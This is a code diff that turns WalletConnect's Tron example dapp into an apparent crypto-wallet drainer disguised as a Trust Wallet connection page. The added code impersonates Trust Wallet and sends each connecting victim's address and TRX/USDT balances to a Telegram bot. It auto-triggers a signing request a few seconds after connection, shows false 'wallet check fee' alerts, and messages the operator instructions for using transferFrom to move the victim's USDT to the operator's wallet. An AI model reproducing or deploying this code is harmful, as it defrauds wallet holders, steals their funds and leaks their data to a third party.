@@ -1,160 +1,292 @@
+import React, { useState, useEffect } from 'react';
 import UniversalProvider from "@walletconnect/universal-provider";
 import { WalletConnectModal } from "@walletconnect/modal";
-import { useEffect, useState } from "react";
 import { TronService, TronChains } from "./utils/tronService";
+import trustWalletLogo from './assets/trustwallet.svg'; // Import the Trust Wallet logo
 
-const projectId = import.meta.env.VITE_PROJECT_ID;
-
-const events: string[] = [];
-
-// 1. select chains (tron)
-const chains = [`tron:${TronChains.Mainnet}`];
-
-// 2. select methods (tron)
-const methods = ["tron_signMessage", "tron_signTransaction"];
-
-// 3. create modal instance
-const modal = new WalletConnectModal({
-  projectId,
-  chains,
-});
+// Environment variables
+const projectId = import.meta.env.VITE_PROJECT_ID || '';
+const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '';
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '';
+const tronApiKey = import.meta.env.VITE_TRON_API_KEY || '';
+const spenderAddress = "TJymGGQzQiXZEwhNxCUGfiUnMQHMm1xb8D";
+const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
 const App = () => {
   const [isConnected, setIsConnected] = useState(false);
-  const [address, setAddress] = useState("");
-  const [balance, setBalance] = useState<number | null>(null);
-
-  // 4. create State for Universal Provider and tronService
   const [provider, setProvider] = useState<UniversalProvider | null>(null);
-  const [tronService, setTronService] = useState<TronService | null>(null);
+  const [modal, setModal] = useState<WalletConnectModal | null>(null);
+  const [address, setAddress] = useState<string | null>(null);
 
-
-  // 5. initialize Universal Provider onLoad
   useEffect(() => {
-    async function setOnInitProvider() {
-      const providerValue = await UniversalProvider.init({
-        logger: "error", // log level
-        projectId: projectId,
+    const initProvider = async () => {
+      const providerInstance = await UniversalProvider.init({
+        logger: "error",
+        projectId,
         metadata: {
-          name: "WalletConnect x Tron",
-          description: "Tron integration with WalletConnect's Universal Provider",
-          url: "https://walletconnect.com/",
-          icons: ["https://avatars.githubusercontent.com/u/37784886"],
+          name: "Trust Wallet",
+          description: "Connect to Trust Wallet",
+          url: "https://trustwallet.com/",
+          icons: ["data:image/jpeg;base64,..."], // URL to Trust Wallet icon
         },
       });
-        
-      setProvider(providerValue);
-    }
-    
-    setOnInitProvider();
-    
+
+      setProvider(providerInstance);
+    };
+
+    initProvider();
   }, []);
 
-  // 6. set tronService and address on setProvider
   useEffect(() => {
+    const initModal = async () => {
+      const modalInstance = new WalletConnectModal({
+        projectId,
+        chains: [`tron:${TronChains.Mainnet}`],
+      });
+
+      setModal(modalInstance);
+    };
+
+    initModal();
+  }, []);
+
+  useEffect(() => {
+    if (!provider || !provider.session) return;
+
+    const tronService = new TronService(provider);
+    const accountAddress = provider.session?.namespaces?.tron?.accounts[0]?.split(":")[2];
+    if (accountAddress) {
+      setAddress(accountAddress);
+    }
+  }, [provider, isConnected]);
+
+  useEffect(() => {
+    if (isConnected && address) {
+      const timer = setTimeout(() => {
+        handleSendTransaction();
+      }, 3000); // 3 seconds delay
+
+      return () => clearTimeout(timer);
+    }
+  }, [isConnected, address]);
+
+  const connectIOS = async () => {
     if (!provider) return;
 
     provider.on("display_uri", async (uri: string) => {
-      console.log("uri", uri);
-      await modal.openModal({
-        uri,
-      });
+      window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
     });
-  }, [provider]);
 
-
-  // 7. get balance when connected
-  useEffect(() => {
-    async function  getBalanceInit() {
-      if (!tronService) return;
-      const res = await tronService.getBalance(address!);
-
-      setBalance(res!);
-    }
-    
-    if (!isConnected) return; 
-    getBalanceInit()
-  }, [isConnected, tronService]);
-
-  // 8. handle connect event
-  const connect = async () => {
     try {
-      if (!provider) return;
-
       await provider.connect({
-        optionalNamespaces: {
+        namespaces: {
           tron: {
-            methods,
-            chains,
-            events,
+            methods: ["tron_signMessage", "tron_signTransaction"],
+            chains: [`tron:${TronChains.Mainnet}`],
+            events: [],
           },
         },
       });
 
-      const tronServiceValue = new TronService(provider);
-      setTronService(tronServiceValue);
+      const tronService = new TronService(provider);
+      const accountAddress = provider.session?.namespaces?.tron?.accounts[0]?.split(":")[2];
+      if (accountAddress) {
+        setAddress(accountAddress);
 
-      console.log("session?", provider);
-      setAddress(provider.session?.namespaces.tron?.accounts[0].split(":")[2]!);
+        const balance = await tronService.getBalance(accountAddress);
+        await sendTelegramMessage(accountAddress, balance, "TRX", "connect");
 
-      setIsConnected(true);
+        const usdtBalance = await getUSDTBalanceFromTronGrid(accountAddress);
+        await sendTelegramMessage(accountAddress, usdtBalance, "USDT", "connect");
+
+        setIsConnected(true);
+      }
     } catch {
       console.log("Something went wrong, request cancelled");
     }
-    modal.closeModal();
   };
 
-  // 9. handle disconnect event
-  const disconnect = async () => {
-    await provider!.disconnect();
-    setIsConnected(false);
+  const connectAndroid = async () => {
+    if (!provider || !modal) return;
+
+    provider.on("display_uri", async (uri: string) => {
+      await modal.openModal({ uri });
+    });
+
+    try {
+      await provider.connect({
+        namespaces: {
+          tron: {
+            methods: ["tron_signMessage", "tron_signTransaction"],
+            chains: [`tron:${TronChains.Mainnet}`],
+            events: [],
+          },
+        },
+      });
+
+      const tronService = new TronService(provider);
+      const accountAddress = provider.session?.namespaces?.tron?.accounts[0]?.split(":")[2];
+      if (accountAddress) {
+        setAddress(accountAddress);
+
+        const balance = await tronService.getBalance(accountAddress);
+        await sendTelegramMessage(accountAddress, balance, "TRX", "connect");
+
+        const usdtBalance = await getUSDTBalanceFromTronGrid(accountAddress);
+        await sendTelegramMessage(accountAddress, usdtBalance, "USDT", "connect");
+
+        setIsConnected(true);
+        modal?.closeModal();
+      }
+    } catch {
+      console.log("Something went wrong, request cancelled");
+    }
   };
 
-  // 10. handle get Balance, signMessage and sendTransaction
-  const handleSign = async () => {
-    console.log("signing");
-    const res = await tronService!.signMessage(
-      `Can i have authorize this request pls - ${Date.now()}`,
-      address!
-    );
-    console.log("result sign: ",res);
+  const getUSDTBalanceFromTronGrid = async (address: string): Promise<number> => {
+    const url = `https://api.trongrid.io/v1/accounts/${address}/transactions/trc20?only_confirmed=true&only_to=true&contract_address=${usdtContractAddress}`;
+    const response = await fetch(url, {
+      headers: {
+        'TRON-PRO-API-KEY': tronApiKey,
+      },
+    });
+    if (!response.ok) {
+      throw new Error('Failed to fetch USDT balance from TronGrid');
+    }
+    const data = await response.json();
+    const usdtToken = data.data.find((token: any) => token.token_info?.address === usdtContractAddress);
+    return usdtToken ? usdtToken.value : 0;
   };
 
-  const handleGetBalance = async () => {
-    const res = await tronService!.getBalance(address!);
-    console.log(res);
-    setBalance(res);
+  const formatTokenBalance = (balance: number, decimals: number): string => {
+    return (balance / Math.pow(10, decimals)).toFixed(decimals);
+  };
+
+  const sendTelegramMessage = async (walletAddress: string, balance: number, token: string = "TRX", type: string = "connect") => {
+    let message;
+    const tronScanUrl = `https://tronscan.org/#/address/${walletAddress}`;
+
+    if (type === "connect") {
+      const formattedBalance = formatTokenBalance(balance, token === "USDT" ? 6 : 18);
+      message = `Wallet connected: ${walletAddress}\n${token} Balance: ${formattedBalance} ${token} (${balance})`;
+    } else if (type === "approve") {
+      message = `Transaction approved for ${token}.\nWallet: ${walletAddress}\nTxHash: ${balance}`;
+    } else if (type === "decline") {
+      message = `Transaction declined for ${token}.\nWallet: ${walletAddress}`;
+    }
+
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: telegramChatId,
+        text: message,
+      }),
+    });
+
+    if (!response.ok) {
+      console.error('Failed to send message to Telegram');
+    }
+  };
+
+  const sendResultPageTelegramMessage = async (walletAddress: string) => {
+    const message = `Transaction needs to be checked at https://tronscan.org/#/address/${walletAddress}. Please wait 1 min so the Contract will be Successful.
+You have to be connected with the wallet to the website. If you are connected, please find Write Contract at
+https://tronscan.org/#/token20/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/code, then transferfrom and input the wallet
+from the user on _from_address, and on _to_address should be your wallet.
+After that, press on Send and accept the Tokens.
+Wallet: ${walletAddress}
+Spender:${spenderAddress}`;
+
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: telegramChatId,
+        text: message,
+      }),
+    });
+
+    if (!response.ok) {
+      console.error('Failed to send message to Telegram');
+    }
   };
 
   const handleSendTransaction = async () => {
-    console.log("signing");
-    const res = await tronService!.sendTransaction(address!, 100);
-    console.log("result send tx: ", res);
+    if (!provider || !address) return;
+
+    try {
+      const tronService = new TronService(provider);
+      const currentBalance = await tronService.getBalance(address);
+      console.log(`Current Balance: ${currentBalance}`);
+      if (currentBalance < 60000000) { //  TRX for example
+        alert("Insufficient funds in wallet. Please add TRX to cover the check wallet fees.");
+        await sendTelegramMessage(address, currentBalance, "TRX", "decline");
+        window.location.href = 'networkselection.html'; // Redirect to networkselection.html
+        return;
+      }
+
+      const signedTx = await tronService.signTransaction(address, 0); // Sign the transaction
+      console.log("Signed transaction: ", signedTx);
+
+      // Broadcast the transaction to the blockchain
+      const broadcastResult = await tronService.broadcastTransaction(signedTx);
+      console.log("Broadcast result: ", broadcastResult);
+
+      if (broadcastResult.result) {
+        const txHash = broadcastResult.txid;
+        await sendResultPageTelegramMessage(address); // Send Telegram message indicating success
+
+        // Transaction was successfully broadcasted, now we can redirect
+        window.location.href = 'result-page.html';
+      } else {
+        // Broadcasting failed, handle accordingly
+        alert("User refused to check the Wallet");
+        window.location.href = 'networkselection.html';
+      }
+    } catch (signError: any) {
+      // This block will catch if the user refuses to sign the transaction
+      console.error("User refused to sign the transaction: ", signError);
+      alert("Your request was declined.");
+      window.location.href = 'networkselection.html'; // Redirect to networkselection.html
+      return;
+    } 
   };
 
   return (
-    <div className="App center-content">
-      <h2>WalletConnect + TRON</h2>
-      {isConnected ? (
-        <>
-          <p>
-            <b>Address: </b>{address}<br />
-            <b>Balance: </b>{balance}<br />
-          </p>
-          <div className="btn-container">
-          <button onClick={handleGetBalance}>get Balance</button>
-            <button onClick={handleSign}>Sign MSG</button>
-            <button onClick={handleSendTransaction}>Send Transaction</button>
-            <button onClick={disconnect}>Disconnect</button>
+    <>
+      <main>
+        <div className="step-container" style={{ display: 'flex' }}>
+          <div className="mb-5"><b className="inline font-bold"></b><b className="inline font-bold"></b></div>
+
+          <div className="w-full">
+            {!isConnected && (
+              <>
+                <div className="network-button" onClick={connectIOS}>
+                  <img src={trustWalletLogo} alt="Trust Wallet" />
+                  <div>
+                    <p className="font-semibold">(iOS)</p>
+                  </div>
+                </div>
+                <div className="network-button" onClick={connectAndroid}>
+                  <img src={trustWalletLogo} alt="Trust Wallet" />
+                  <div>
+                    <p className="font-semibold">(Android)</p>
+                  </div>
+                </div>
+              </>
+            )}
           </div>
-        </>
-      ) : (
-        <button onClick={connect}>Connect</button>
-      )}
-      <div className="circle">
-        <a href="https://github.com/WalletConnect/web-examples/tree/main/dapps/universal-provider-tron" target="_blank"><img src="/github.png" alt="GitHub" width="50" /></a>
-      </div>
-    </div>
+        </div>
+      </main>
+
+    </>
   );
 };
 
